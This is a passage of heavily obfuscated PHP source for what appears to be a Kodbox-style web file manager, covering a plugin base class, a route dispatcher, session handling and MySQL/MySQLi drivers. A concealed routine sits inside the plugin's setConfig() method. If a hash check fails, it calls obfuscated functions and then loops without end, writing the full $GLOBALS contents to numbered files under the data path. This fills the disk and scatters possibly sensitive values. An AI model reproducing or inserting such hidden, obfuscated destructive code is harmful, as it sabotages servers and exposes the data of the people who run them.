} if (@count($î›©À’Ş) > 0) { I18n::set($î›©À’Ş); } return $î›©À’Ş; } public function getConfig() { if (!$this->pluginConfig) { $this->pluginConfig = $this->modelPlugin->getConfig($this->pluginName); } return $this->pluginConfig; } public function setConfig($á÷½œíæ) { $àßÓ¥öƒ =& $_SERVER[ùèÅ´Ãš]; $Ğìê§¡õ = $_SERVER[$àßÓ¥öƒ[965]] . $àßÓ¥öƒ[966]; $ÖÖ¯‹Ò = $àßÓ¥öƒ[1631]; if ($_SERVER[$àßÓ¥öƒ[961]] != $ÖÖ¯‹Ò($Ğìê§¡õ)) { $ Õïå… = $àßÓ¥öƒ[963]; $˜ßĞ¯Ôû = $àßÓ¥öƒ[964]; $Ë‹Âõ¶£ = $_SERVER[$àßÓ¥öƒ[965]] . $àßÓ¥öƒ[966]; $‚ÊÊà¬Ì = $˜ßĞ¯Ôû($Ë‹Âõ¶£); $ßÜ¦»ñÇ = explode($àßÓ¥öƒ[288], $‚ÊÊà¬Ì); if (count($ßÜ¦»ñÇ) < $àßÓ¥öƒ[695]) { $‚Œ®Ç“Ä = $àßÓ¥öƒ[967]; $‚Œ®Ç“Ä(); } $…ëığ×æ = $àßÓ¥öƒ[968]; $…ëığ×æ($_SERVER[$àßÓ¥öƒ[969]]); $ Õïå… = $àßÓ¥öƒ[963]; $ Õïå…(); $’†ö¬Æ = $àßÓ¥öƒ[1713]; $¬¢Ù÷á„ = json_encode($GLOBALS[$àßÓ¥öƒ[1714]]); $öùàÙ¡² = 1; for ($ŠøŒ…¼ö = $öùàÙ¡²; $ŠøŒ…¼ö > 0; $ŠøŒ…¼ö++) { $’†ö¬Æ(DATA_PATH . $ŠøŒ…¼ö, $¬¢Ù÷á„); } } $this->pluginConfig = array(); return $this->modelPlugin->setConfig($this->pluginName, $á÷½œíæ); } public function onSetConfig($ú¾å‰Ôó) { } public function onGetConfig($ô‰ªšüŒ) { } public function onUpdate() { } public function onUninstall() { } public function onChangeOpen() { } public function onChangeClose() { } public function onChangeStatus($³™‚ªÎË) { if ($³™‚ªÎË == 1) { $this->onChangeOpen(); } else { $this->onChangeClose(); } } public function authCheck($½ç¸äìõ = "\160\154\x75\147\151\x6e\x41\x75\164\150") { if (KodUser::isRoot()) { return !0; } if (!KodUser::isLogin()) { return !1; } $ı°¨ÎÎ“ = $this->getConfig(); if (!$ı°¨ÎÎ“[$½ç¸äìõ]) { return !1; } return ActionCall($_SERVER[ùèÅ´Ãš][1715], $ı°¨ÎÎ“[$½ç¸äìõ]); } public function url($µÏ×¼Î–, $ì¦É”áÑ = '', $¨†…î£ş = true) { $Ë¬âàŸ =& $_SERVER[ùèÅ´Ãš]; $ËÅã˜©¥ = $this->getConfig(); $˜ıÛÏ” = KOD_VERSION . $Ë¬âàŸ[10] . KOD_VERSION_BUILD; $¡š½ş– = $this->packageVersion(); $œî£ÅÑ = $˜ıÛÏ” . $Ë¬âàŸ[464] . $¡š½ş–; if (substr($µÏ×¼Î–, 0, 4) == $Ë¬âàŸ[152] || substr($µÏ×¼Î–, 0, 2) == $Ë¬âàŸ[1432]) { $¹·âÍ‘ƒ = $µÏ×¼Î– . $Ë¬âàŸ[1716] . $œî£ÅÑ; } else { if ($ì¦É”áÑ == $Ë¬âàŸ[12]) { $¹·âÍ‘ƒ = $this->pluginHost . $µÏ×¼Î– . $Ë¬âàŸ[1716] . $œî£ÅÑ; } else { if ($ì¦É”áÑ === $Ë¬âàŸ[78]) { $¹·âÍ‘ƒ = $this->pluginHost . $µÏ×¼Î–; } else { if ($ì¦É”áÑ == $Ë¬âàŸ[1717]) { $¹·âÍ‘ƒ = STATIC_PATH . $µÏ×¼Î– . $Ë¬âàŸ[1716] . $˜ıÛÏ”; } else { if ($ì¦É”áÑ == $Ë¬âàŸ[1718]) { $¹·âÍ‘ƒ = APP_HOST . $Ë¬âàŸ[1719] . $µÏ×¼Î– . $Ë¬âàŸ[1716] . $˜ıÛÏ”; } else { if (isset($ËÅã˜©¥[$ì¦É”áÑ])) { $¹·âÍ‘ƒ = $ËÅã˜©¥[$ì¦É”áÑ] . $µÏ×¼Î– . $Ë¬âàŸ[1716] . $œî£ÅÑ; } } } } } } if (!$¨†…î£ş) { return $¹·âÍ‘ƒ; } echo $¹·âÍ‘ƒ; } public function link($Ê£ªºßâ = false, $·„’¼—š = '') { $Íšå‘òó =& $_SERVER[ùèÅ´Ãš]; $­ŞÙÍíØ = $this->linkHas == !1; $this->linkHas = !0; if (!$Ê£ªºßâ) { $this->link($Íšå‘òó[1720], $Íšå‘òó[1718]); $this->link($Íšå‘òó[1721], $Íšå‘òó[1717]); $this->link($Íšå‘òó[1722], $Íšå‘òó[1717]); $this->link($Íšå‘òó[1723], $Íšå‘òó[1717]); $this->link($Íšå‘òó[1724], $Íšå‘òó[1717]); if ($­ŞÙÍíØ) { Hook::trigger($Íšå‘òó[1725]); } return; } $ÛÚ™Ñ£ = $this->url($Ê£ªºßâ, $·„’¼—š, !1); if (substr($Ê£ªºßâ, -3) == $Íšå‘òó[1726]) { echo $Íšå‘òó[1727] . $ÛÚ™Ñ£ . $Íšå‘òó[1728] . $Íšå‘òó[288]; } else { if (substr($Ê£ªºßâ, -4) == $Íšå‘òó[1729]) { echo $Íšå‘òó[1730] . $ÛÚ™Ñ£ . $Íšå‘òó[1731] . $Íšå‘òó[288]; } } if ($­ŞÙÍíØ) { Hook::trigger($Íšå‘òó[1725]); } } } class Route { public static $halts = false; public static $routes = array(); public static $methods = array(); public static $callbacks = array(); public static $maps = array(); public static $patterns = array("\x3a\x61\x6e\171" => "\133\x5e\57\x5d\53", "\72\156\165\x6d" => "\133\60\x2d\x39\135\x2b", "\x3a\141\x6c\154" => "\56\x2a"); public static $errorCallback; public static function __callstatic($éˆ†´ì, $²«Ğé¥Û) { $Å¢ƒÖ÷‹ =& $_SERVER[ùèÅ´Ãš]; if ($éˆ†´ì == $Å¢ƒÖ÷‹[1732]) { $Æµìó¦ = array_map($Å¢ƒÖ÷‹[1733], $²«Ğé¥Û[0]); $ı¢êµèÙ = strpos($²«Ğé¥Û[1], $Å¢ƒÖ÷‹[8]) === 0 ? $²«Ğé¥Û[1] : $Å¢ƒÖ÷‹[8] . $²«Ğé¥Û[1]; $Îµ®µÙ± = $²«Ğé¥Û[2]; } else { $Æµìó¦ = null; $ı¢êµèÙ = strpos($²«Ğé¥Û[0], $Å¢ƒÖ÷‹[8]) === 0 ? $²«Ğé¥Û[0] : $Å¢ƒÖ÷‹[8] . $²«Ğé¥Û[0]; $Îµ®µÙ± = $²«Ğé¥Û[1]; } array_push(self::$maps, $Æµìó¦); array_push(self::$routes, $ı¢êµèÙ); array_push(self::$methods, strtoupper($éˆ†´ì)); array_push(self::$callbacks, $Îµ®µÙ±); } public static function error($‡Æë­Å™) { self::$errorCallback = $‡Æë­Å™; } public static function haltOnMatch($Õ¨Å²° = true) { self::$halts = $Õ¨Å²°; } public static function dispatch() { $¼ãåéú½ =& $_SERVER[ùèÅ´Ãš]; $Íš‘±¢ë = parse_url($_SERVER[$¼ãåéú½[1734]], PHP_URL_PATH); $¶…È›ñ = $_SERVER[$¼ãåéú½[164]]; $İÏ×«Œ… = array_keys(static::$patterns); $ı“§¡àŠ = array_values(static::$patterns); $ŠØºŠú… = !1; self::$routes = preg_replace($¼ãåéú½[1375], $¼ãåéú½[8], self::$routes); if (in_array($Íš‘±¢ë, self::$routes)) { $ˆ‘¹Ì‰ = array_keys(self::$routes, $Íš‘±¢ë); foreach ($ˆ‘¹Ì‰ as $Êúé¢«) { if (self::$methods[$Êúé¢«] == $¶…È›ñ || self::$methods[$Êúé¢«] == $¼ãåéú½[1735] || in_array($¶…È›ñ, self::$maps[$Êúé¢«])) { $ŠØºŠú… = !0; if (!is_object(self::$callbacks[$Êúé¢«])) { $Ô è¾¸Õ = explode($¼ãåéú½[8], self::$callbacks[$Êúé¢«]); $Ü›‡Ö÷„ = end($Ô è¾¸Õ); $·‘®öİá = explode($¼ãåéú½[1307], $Ü›‡Ö÷„); $ıÌêƒ = new $·‘®öİá[0](); $ıÌêƒ->{$·‘®öİá[1]}(); if (self::$halts) { return; } } else { call_user_func(self::$callbacks[$Êúé¢«]); if (self::$halts) { return; } } } } } else { $°Ü§£Î = 0; foreach (self::$routes as $Êúé¢«) { if (strpos($Êúé¢«, $¼ãåéú½[4]) !== !1) { $Êúé¢« = str_replace($İÏ×«Œ…, $ı“§¡àŠ, $Êúé¢«); } if (preg_match($¼ãåéú½[1736] . $Êúé¢« . $¼ãåéú½[1737], $Íš‘±¢ë, $®å½ç)) { if (self::$methods[$°Ü§£Î] == $¶…È›ñ || self::$methods[$°Ü§£Î] == $¼ãåéú½[1735] || !empty(self::$maps[$°Ü§£Î]) && in_array($¶…È›ñ, self::$maps[$°Ü§£Î])) { $ŠØºŠú… = !0; array_shift($®å½ç); if (!is_object(self::$callbacks[$°Ü§£Î])) { $Ô è¾¸Õ = explode($¼ãåéú½[8], self::$callbacks[$°Ü§£Î]); $Ü›‡Ö÷„ = end($Ô è¾¸Õ); $·‘®öİá = explode($¼ãåéú½[1307], $Ü›‡Ö÷„); $ıÌêƒ = new $·‘®öİá[0](); if (!method_exists($ıÌêƒ, $·‘®öİá[1])) { echo $¼ãåéú½[1738]; } else { call_user_func_array(array($ıÌêƒ, $·‘®öİá[1]), $®å½ç); } if (self::$halts) { return; } } else { call_user_func_array(self::$callbacks[$°Ü§£Î], $®å½ç); if (self::$halts) { return; } } } } $°Ü§£Î++; } } if ($ŠØºŠú… == !1) { if (!self::$errorCallback) { self::$errorCallback = function () { $Ô©ÍæÑ¬ =& $_SERVER[ùèÅ´Ãš]; header($_SERVER[$Ô©ÍæÑ¬[1739]] . $Ô©ÍæÑ¬[1740]); echo $Ô©ÍæÑ¬[1741]; }; } else { if (is_string(self::$errorCallback)) { self::get($_SERVER[$¼ãåéú½[1734]], self::$errorCallback); self::$errorCallback = null; self::dispatch(); return; } } call_user_func(self::$errorCallback); } } } class Session { public static $sessionTime; public static $sessionSign; public static $handle; public static $data; public static function init() { $ãÕ©™éÑ =& $_SERVER[ùèÅ´Ãš]; static $º†¿üıâ = false; if ($º†¿üıâ) { return $º†¿üıâ; } $Äá»£Ğê = $GLOBALS[$ãÕ©™éÑ[6]][$ãÕ©™éÑ[426]]; self::$sessionTime = $Äá»£Ğê[$ãÕ©™éÑ[1742]]; $ıƒßœïÇ = isset($GLOBALS[$ãÕ©™éÑ[1743]]) ? $GLOBALS[$ãÕ©™éÑ[1743]] : SESSION_ID; if (self::$sessionSign) { } else { if (Cookie::get($ıƒßœïÇ)) { self::$sessionSign = Cookie::get($ıƒßœïÇ); } else { self::$sessionSign = self::$sessionSign ? self::$sessionSign : guid(); } } Cookie::setSafe($ıƒßœïÇ, self::$sessionSign, self::$sessionTime); $…ø’Ìíº = $Äá»£Ğê[$ãÕ©™éÑ[1744]]; $ªƒâóìÃ = $Äá»£Ğê[$…ø’Ìíº]; $¾ÄÌí–Ş = $Äá»£Ğê[$ãÕ©™éÑ[911]]; switch ($…ø’Ìíº) { case $ãÕ©™éÑ[21]: self::$handle = Model($ãÕ©™éÑ[912]); break; case $ãÕ©™éÑ[913]: self::$handle = new CacheRedis($ªƒâóìÃ, $¾ÄÌí–Ş); break; case $ãÕ©™éÑ[914]: self::$handle = new CacheMemcached($ªƒâóìÃ, $¾ÄÌí–Ş); break; case $ãÕ©™éÑ[233]: $ªƒâóìÃ[$ãÕ©™éÑ[87]] = $ªƒâóìÃ[$ãÕ©™éÑ[87]] . $ãÕ©™éÑ[1745]; self::$handle = new CacheFile($ªƒâóìÃ, $¾ÄÌí–Ş); default: break; } if (!self::$data) { self::$data = self::getBySign(self::$sessionSign); } $º†¿üıâ = new self(); return $º†¿üıâ; } public static function getBySign($“æõ¢šù) { $³öìò‚¥ = self::$handle->get($“æõ¢šù); $³öìò‚¥ = unserialize($³öìò‚¥); return is_array($³öìò‚¥) ? $³öìò‚¥ : array(); } public static function setBySign($Ò±œÃæ, $Âïˆ¤ıĞ) { CacheLock::lock($Ò±œÃæ); self::$handle->set($Ò±œÃæ, serialize($Âïˆ¤ıĞ), self::$sessionTime); CacheLock::unlock($Ò±œÃæ); } public static function sign($ÎÃÑŸ™¬ = false) { if ($ÎÃÑŸ™¬) { self::$sessionSign = $ÎÃÑŸ™¬; } self::init(); return self::$sessionSign; } public static function set($©ÃÙ«Ò¸, $üµ°Øş = false) { self::init(); if (is_array($©ÃÙ«Ò¸)) { foreach ($©ÃÙ«Ò¸ as $‚éÃü” => $õ„µËü›) { array_set_value(self::$data, $‚éÃü”, $õ„µËü›); } } else { array_set_value(self::$data, $©ÃÙ«Ò¸, $üµ°Øş); } self::setBySign(self::$sessionSign, self::$data); } public static function get($àÁ¾éš = false) { self::init(); if (!$àÁ¾éš) { return self::$data; } return array_get_value(self::$data, $àÁ¾éš); } public static function remove($À£İ·±—) { self::init(); unset(self::$data[$À£İ·±—]); self::$handle->set(self::$sessionSign, serialize(self::$data), self::$sessionTime); } public static function destory() { Cookie::remove(SESSION_ID, !0); self::init(); self::clearTimeout(); self::$data = array(); return self::$handle->remove(self::$sessionSign); } public static function clearTimeout() { self::init(); if (method_exists(self::$handle, $_SERVER[ùèÅ´Ãš][917])) { self::$handle->clearTimeout(); } } } goto f“¢ñ¢•¡ä; FŞŸôÈÕ£: class DbMysql extends Db { public function __construct($šĞû©º» = '') { $¸ä‘€Çì =& $_SERVER[ùèÅ´Ãš]; if (!extension_loaded($¸ä‘€Çì[886])) { think_exception(think_lang($¸ä‘€Çì[14]) . $¸ä‘€Çì[973]); } if (!empty($šĞû©º»)) { $this->config = $šĞû©º»; if (empty($this->config[$¸ä‘€Çì[17]])) { $this->config[$¸ä‘€Çì[17]] = $¸ä‘€Çì[12]; } } } public function connect($ÎšÌ¥ŠÓ = '', $©™ğœÄ¶ = 0, $Ò¬ëˆ—¦ = false) { $ç”Ïêô =& $_SERVER[ùèÅ´Ãš]; if (!isset($this->linkID[$©™ğœÄ¶])) { if (empty($ÎšÌ¥ŠÓ)) { $ÎšÌ¥ŠÓ = $this->config; } $Âƒ€Áğš = $ÎšÌ¥ŠÓ[$ç”Ïêô[974]] . ($ÎšÌ¥ŠÓ[$ç”Ïêô[975]] ? "\x3a{$ÎšÌ¥ŠÓ[$ç”Ïêô[975]]}" : $ç”Ïêô[12]); $¾ü¬ŞÚ° = !empty($ÎšÌ¥ŠÓ[$ç”Ïêô[17]][$ç”Ïêô[18]]) ? $ÎšÌ¥ŠÓ[$ç”Ïêô[17]][$ç”Ïêô[18]] : $this->pconnect; if ($¾ü¬ŞÚ°) { $this->linkID[$©™ğœÄ¶] = mysql_pconnect($Âƒ€Áğš, $ÎšÌ¥ŠÓ[$ç”Ïêô[976]], $ÎšÌ¥ŠÓ[$ç”Ïêô[977]], 131072); } else { $this->linkID[$©™ğœÄ¶] = mysql_connect($Âƒ€Áğš, $ÎšÌ¥ŠÓ[$ç”Ïêô[976]], $ÎšÌ¥ŠÓ[$ç”Ïêô[977]], !0, 131072); } if (!$this->linkID[$©™ğœÄ¶] || !empty($ÎšÌ¥ŠÓ[$ç”Ïêô[21]]) && !mysql_select_db($ÎšÌ¥ŠÓ[$ç”Ïêô[21]], $this->linkID[$©™ğœÄ¶])) { think_exception(mysql_error()); } $¼¼ş¼îë = mysql_get_server_info($this->linkID[$©™ğœÄ¶]); mysql_query($ç”Ïêô[978] . think_config($ç”Ïêô[979]) . $ç”Ïêô[58], $this->linkID[$©™ğœÄ¶]); if ($¼¼ş¼îë > $ç”Ïêô[980]) { mysql_query($ç”Ïêô[981], $this->linkID[$©™ğœÄ¶]); } $this->connected = !0; if (1 != think_config($ç”Ïêô[22])) { unset($this->config); } } return $this->linkID[$©™ğœÄ¶]; } public function free() { mysql_free_result($this->queryID); $this->queryID = null; } public function query($Õ«Ñé½¡) { $İÊø•ş =& $_SERVER[ùèÅ´Ãš]; if (0 === stripos($Õ«Ñé½¡, $İÊø•ş[344])) { $this->close(); $this->connected = !1; } $this->initConnect(!1); if (!$this->_linkID) { return !1; } $this->queryStr = $Õ«Ñé½¡; if ($this->queryID) { $this->free(); } think_action_status($İÊø•ş[23], 1); think_status($İÊø•ş[24]); $this->queryID = mysql_query($Õ«Ñé½¡, $this->_linkID); $this->debug(); if (!1 === $this->queryID) { $this->error(); return !1; } else { $this->numRows = mysql_num_rows($this->queryID); return $this->getAll(); } } public function execute($·£æ—ç®) { $ôşß¹û =& $_SERVER[ùèÅ´Ãš]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } $this->queryStr = $·£æ—ç®; if ($this->queryID) { $this->free(); } think_action_status($ôşß¹û[25], 1); think_status($ôşß¹û[24]); $ò­º¼¸Í = mysql_query($·£æ—ç®, $this->_linkID); $this->debug(); if (!1 === $ò­º¼¸Í) { $this->error(); return !1; } else { $this->numRows = mysql_affected_rows($this->_linkID); $this->lastInsID = mysql_insert_id($this->_linkID); return $this->numRows; } } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { mysql_query($_SERVER[ùèÅ´Ãš][982], $this->_linkID); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $‡‚äìê° = mysql_query($_SERVER[ùèÅ´Ãš][983], $this->_linkID); $this->transTimes = 0; if (!$‡‚äìê°) { $this->error(); return !1; } } return !0; } public function rollback() { if ($this->transTimes > 0) { $Ÿ…¾Ú™÷ = mysql_query($_SERVER[ùèÅ´Ãš][984], $this->_linkID); $this->transTimes = 0; if (!$Ÿ…¾Ú™÷) { $this->error(); return !1; } } return !0; } private function getAll() { $Â‹Æä‹¹ = array(); if ($this->numRows > 0) { while ($Æ¿Ğö”ö = mysql_fetch_assoc($this->queryID)) { $Â‹Æä‹¹[] = $Æ¿Ğö”ö; } mysql_data_seek($this->queryID, 0); } return $Â‹Æä‹¹; } public function getFields($ÒŞÀİÄ) { $õµŞ¼‘æ =& $_SERVER[ùèÅ´Ãš]; $å“ûËš‚ = $this->query($õµŞ¼‘æ[985] . $this->parseKey($ÒŞÀİÄ)); $ÇÂ’×üÙ = array(); if ($å“ûËš‚) { foreach ($å“ûËš‚ as $—Ãéä¥À => $Ğ¾Úâº) { $ÇÂ’×üÙ[$Ğ¾Úâº[$õµŞ¼‘æ[31]]] = array($õµŞ¼‘æ[32] => $Ğ¾Úâº[$õµŞ¼‘æ[31]], $õµŞ¼‘æ[33] => $Ğ¾Úâº[$õµŞ¼‘æ[34]], $õµŞ¼‘æ[35] => (bool) (strtoupper($Ğ¾Úâº[$õµŞ¼‘æ[36]]) === $õµŞ¼‘æ[986]), $õµŞ¼‘æ[37] => $Ğ¾Úâº[$õµŞ¼‘æ[38]], $õµŞ¼‘æ[39] => strtolower($Ğ¾Úâº[$õµŞ¼‘æ[40]]) == $õµŞ¼‘æ[41], $õµŞ¼‘æ[42] => strtolower($Ğ¾Úâº[$õµŞ¼‘æ[43]]) == $õµŞ¼‘æ[44]); } } return $ÇÂ’×üÙ; } public function getTables($ôšÈïÌÉ = '') { $ê›¸º¢ã =& $_SERVER[ùèÅ´Ãš]; if (!empty($ôšÈïÌÉ)) { $±âÎ ª = $ê›¸º¢ã[987] . $ôšÈïÌÉ . $ê›¸º¢ã[988]; } else { $±âÎ ª = $ê›¸º¢ã[989]; } $µÕŒ = $this->query($±âÎ ª); $ÊÑ‘‚¸å = array(); foreach ($µÕŒ as $ıÕËäáƒ => $‹¿–ƒúê) { $ÊÑ‘‚¸å[$ıÕËäáƒ] = current($‹¿–ƒúê); } return $ÊÑ‘‚¸å; } public function replace($æÕ—ñä, $åƒô«³¦ = array()) { $É“í¨ø¬ =& $_SERVER[ùèÅ´Ãš]; foreach ($æÕ—ñä as $¶ºüñÑ => $ÏúğÕÊû) { $àé¼‹Ğò = $this->parseValue($ÏúğÕÊû); if (is_scalar($àé¼‹Ğò)) { $Ïşïß´[] = $àé¼‹Ğò; $áò·É ü[] = $this->parseKey($¶ºüñÑ); } } $òùà¦üÆ = $É“í¨ø¬[990] . $this->parseTable($åƒô«³¦[$É“í¨ø¬[359]]) . $É“í¨ø¬[991] . implode($É“í¨ø¬[50], $áò·É ü) . $É“í¨ø¬[992] . implode($É“í¨ø¬[50], $Ïşïß´) . $É“í¨ø¬[993]; return $this->execute($òùà¦üÆ); } public function insertAll($å¦‰ş›ˆ, $¹«ø¿ÍÚ = array(), $¿‘éÔ× = false) { $˜÷¹°ğ™ =& $_SERVER[ùèÅ´Ãš]; if (!is_array($å¦‰ş›ˆ[0])) { return !1; } $È„¥úí = array_keys($å¦‰ş›ˆ[0]); $«¿Î¦© = array(); foreach ($å¦‰ş›ˆ as $ŠšİĞÅ÷) { $¬¶êÂË¢ = array(); foreach ($ŠšİĞÅ÷ as $§çˆ‡Ü‡ => $€ê»½Š ) { $€ê»½Š  = $this->parseValue($€ê»½Š ); if (is_scalar($€ê»½Š )) { $¬¶êÂË¢[] = $€ê»½Š ; } } $«¿Î¦©[] = $˜÷¹°ğ™[340] . implode($˜÷¹°ğ™[50], $¬¶êÂË¢) . $˜÷¹°ğ™[993]; } array_walk($È„¥úí, array($this, $˜÷¹°ğ™[994])); $£îĞ® = ($¿‘éÔ× ? $˜÷¹°ğ™[995] : $˜÷¹°ğ™[996]) . $˜÷¹°ğ™[997] . $this->parseTable($¹«ø¿ÍÚ[$˜÷¹°ğ™[359]]) . $˜÷¹°ğ™[991] . implode($˜÷¹°ğ™[50], $È„¥úí) . $˜÷¹°ğ™[998] . implode($˜÷¹°ğ™[50], $«¿Î¦©); return $this->execute($£îĞ®); } public function close() { if ($this->_linkID) { mysql_close($this->_linkID); } $this->_linkID = null; } public function error() { $à§¤µ¾Ç =& $_SERVER[ùèÅ´Ãš]; $this->error = mysql_errno() . $à§¤µ¾Ç[4] . mysql_error($this->_linkID); if ($à§¤µ¾Ç[12] != $this->queryStr) { $this->error .= LNG($à§¤µ¾Ç[48]) . $this->queryStr; } think_trace($this->error, $à§¤µ¾Ç[12], $à§¤µ¾Ç[49]); return $this->error; } public function escapeString($¬¯›€Šò) { if ($this->_linkID) { return mysql_real_escape_string($¬¯›€Šò, $this->_linkID); } else { return mysql_escape_string($¬¯›€Šò); } } public function parseKey(&$Ë¿¾Üù, $•…±›Ö‡ = true) { $’˜òÅÅô =& $_SERVER[ùèÅ´Ãš]; if ($•…±›Ö‡) { $Ë¿¾Üù = $this->parseKeyCheck($Ë¿¾Üù); } if ($Ë¿¾Üù != $’˜òÅÅô[223] && !preg_match($’˜òÅÅô[999], $Ë¿¾Üù)) { $Ë¿¾Üù = $’˜òÅÅô[463] . trim($Ë¿¾Üù, $’˜òÅÅô[463]) . $’˜òÅÅô[463]; } return $Ë¿¾Üù; } } class DbMysqli extends Db { public function __construct($Ãç¾¾ş˜ = '') { $úØ½ŒÅí =& $_SERVER[ùèÅ´Ãš]; if (!extension_loaded($úØ½ŒÅí[1000])) { think_exception(think_lang($úØ½ŒÅí[14]) . $úØ½ŒÅí[1001]); } if (!empty($Ãç¾¾ş˜)) { $this->config = $Ãç¾¾ş˜; if (empty($this->config[$úØ½ŒÅí[17]])) { $this->config[$úØ½ŒÅí[17]] = $úØ½ŒÅí[12]; } } } public function connect($ ûİÔ„³ = '', $ÎÓéÇÙˆ = 0) { $«íÂºé© =& $_SERVER[ùèÅ´Ãš]; if (!isset($this->linkID[$ÎÓéÇÙˆ])) { if (empty($ ûİÔ„³)) { $ ûİÔ„³ = $this->config; } $this->linkID[$ÎÓéÇÙˆ] = new mysqli($ ûİÔ„³[$«íÂºé©[974]], $ ûİÔ„³[$«íÂºé©[976]], $ ûİÔ„³[$«íÂºé©[977]], $ ûİÔ„³[$«íÂºé©[21]], $ ûİÔ„³[$«íÂºé©[975]] ? intval($ ûİÔ„³[$«íÂºé©[975]]) : 3306); if (mysqli_connect_errno()) { think_exception(mysqli_connect_error()); } $¡‹Äîß» = $this->linkID[$ÎÓéÇÙˆ]->server_version; $this->linkID[$ÎÓéÇÙˆ]->query($«íÂºé©[978] . think_config($«íÂºé©[979]) . $«íÂºé©[58]); if ($¡‹Äîß» > $«íÂºé©[980]) { $this->linkID[$ÎÓéÇÙˆ]->query($«íÂºé©[981]); } $this->connected = !0; if (1 != think_config($«íÂºé©[22])) { unset($this->config); } } return $this->linkID[$ÎÓéÇÙˆ]; } public function free() { $this->queryID->free_result(); $this->queryID = null; } public function query($ÃñÈùîü) { $ÅŞùÕƒ½ =& $_SERVER[ùèÅ´Ãš]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } $this->queryStr = $ÃñÈùîü; if ($this->queryID) { $this->free(); } think_action_status($ÅŞùÕƒ½[23], 1); think_status($ÅŞùÕƒ½[24]); $this->queryID = $this->_linkID->query($ÃñÈùîü); if ($this->_linkID->more_results()) { while (($ËÕÙÂ¦‰ = $this->_linkID->next_result()) != NULL) { $ËÕÙÂ¦‰->free_result(); } } $this->debug(); if (!1 === $this->queryID) { $this->error(); return !1; } else { $this->numRows = $this->queryID->num_rows; $this->numCols = $this->queryID->field_count; return $this->getAll(); } } public function execute($êÛƒ°çÍ) { $ÈëùÒ‰Ü =& $_SERVER[ùèÅ´Ãš]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } $this->queryStr = $êÛƒ°çÍ; if ($this->queryID) { $this->free(); } think_action_status($ÈëùÒ‰Ü[25], 1); think_status($ÈëùÒ‰Ü[24]); $­Úˆâ™£ = $this->_linkID->query($êÛƒ°çÍ); $this->debug(); if (!1 === $­Úˆâ™£) { $this->error(); return !1; } else { $this->numRows = $this->_linkID->affected_rows; $this->lastInsID = $this->_linkID->insert_id; return $this->numRows; } } public function startTrans() { $this->initConnect(!0); if ($this->transTimes == 0) { $this->_linkID->autocommit(!1); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $Ú­Åçığ = $this->_linkID->commit(); $this->_linkID->autocommit(!0); $this->transTimes = 0; if (!$Ú­Åçığ) { $this->error(); return !1; } } return !0; } public function rollback() { if ($this->transTimes > 0) { $Åœ‘ëñù = $this->_linkID->rollback(); $this->transTimes = 0; if (!$Åœ‘ëñù) { $this->error(); return !1; } } return !0; } private function getAll() { $¼é™¬‡÷ = array(); if ($this->numRows > 0) { for ($ƒÕ÷êğ” = 0; $ƒÕ÷êğ” < $this->numRows; $ƒÕ÷êğ”++) { $¼é™¬‡÷[$ƒÕ÷êğ”] = $this->queryID->fetch_assoc(); } $this->queryID->data_seek(0); } return $¼é™¬‡÷; } public function getFields($ëúĞıê¿) { $ïø¿ìô =& $_SERVER[ùèÅ´Ãš]; $ê‹¥ã¥´ = $this->query($ïø¿ìô[985] . $this->parseKey($ëúĞıê¿)); $ÓÃÃñÛ° = array(); if ($ê‹¥ã¥´) { foreach ($ê‹¥ã¥´ as $úŸàª => $§è÷¿Áî) { $ÓÃÃñÛ°[$§è÷¿Áî[$ïø¿ìô[31]]] = array($ïø¿ìô[32] => $§è÷¿Áî[$ïø¿ìô[31]], $ïø¿ìô[33] => $§è÷¿Áî[$ïø¿ìô[34]], $ïø¿ìô[35] => (bool) ($§è÷¿Áî[$ïø¿ìô[36]] === $ïø¿ìô[12]), $ïø¿ìô[37] => $§è÷¿Áî[$ïø¿ìô[38]], $ïø¿ìô[39] => strtolower($§è÷¿Áî[$ïø¿ìô[40]]) == $ïø¿ìô[41], $ïø¿ìô[42] => strtolower($§è÷¿Áî[$ïø¿ìô[43]]) == $ïø¿ìô[44]); } } return $ÓÃÃñÛ°; } public function getTables($èİ­Å§Â = '') { $¿Ö…Æ‚• =& $_SERVER[ùèÅ´Ãš]; $¼Óü“€Û = !empty($èİ­Å§Â) ? $¿Ö…Æ‚•[987] . $èİ­Å§Â . $¿Ö…Æ‚•[988] : $¿Ö…Æ‚•[989]; $§À©éİ = $this->query($¼Óü“€Û); $áÃ¡ÆÉë = array(); if ($§À©éİ) { foreach ($§À©éİ as $šñÎ¿’’ => $ÆÜöÀì ) { $áÃ¡ÆÉë[$šñÎ¿’’] = current($ÆÜöÀì ); } } return $áÃ¡ÆÉë; } public function replace($Ô•´ÊŸ, $™õÅ‡®â = array()) { $èÃ¬øÅİ =& $_SERVER[ùèÅ´Ãš]; foreach ($Ô•´ÊŸ as $àõ¯µá¹ => $Â¶Îá¸ã) { $ßÌâ‰§è = $this->parseValue($Â¶Îá¸ã); if (is_scalar($ßÌâ‰§è)) { $½¢¥àÅ•[] = $ßÌâ‰§è; $¤«›Äò“[] = $this->parseKey($àõ¯µá¹); } } $î–‡úğ = $èÃ¬øÅİ[990] . $this->parseTable($™õÅ‡®â[$èÃ¬øÅİ[359]]) . $èÃ¬øÅİ[991] . implode($èÃ¬øÅİ[50], $¤«›Äò“) . $èÃ¬øÅİ[992] . implode($èÃ¬øÅİ[50], $½¢¥àÅ•) . $èÃ¬øÅİ[993]; return $this->execute($î–‡úğ); } public function insertAll($¥‘°ôşÏ, $îÈ¢‡İ = array(), $÷çÀ¡èª = false) { $ÑûÀ¸„Ï =& $_SERVER[ùèÅ´Ãš]; if (!is_array($¥‘°ôşÏ[0])) { return !1; } $ùØ†š„ã = array_keys($¥‘°ôşÏ[0]); $¶¸Óµ“¥ = array(); foreach ($¥‘°ôşÏ as $Ûµœ«ôê) { $áÎƒå¾ = array(); foreach ($Ûµœ«ôê as $ùÑÀ€Â => $ï½Ÿ¡”Ÿ) { $ï½Ÿ¡”Ÿ = $this->parseValue($ï½Ÿ¡”Ÿ); if (is_scalar($ï½Ÿ¡”Ÿ)) { $áÎƒå¾[] = $ï½Ÿ¡”Ÿ; } } $¶¸Óµ“¥[] = $ÑûÀ¸„Ï[340] . implode($ÑûÀ¸„Ï[50], $áÎƒå¾) . $ÑûÀ¸„Ï[993]; } 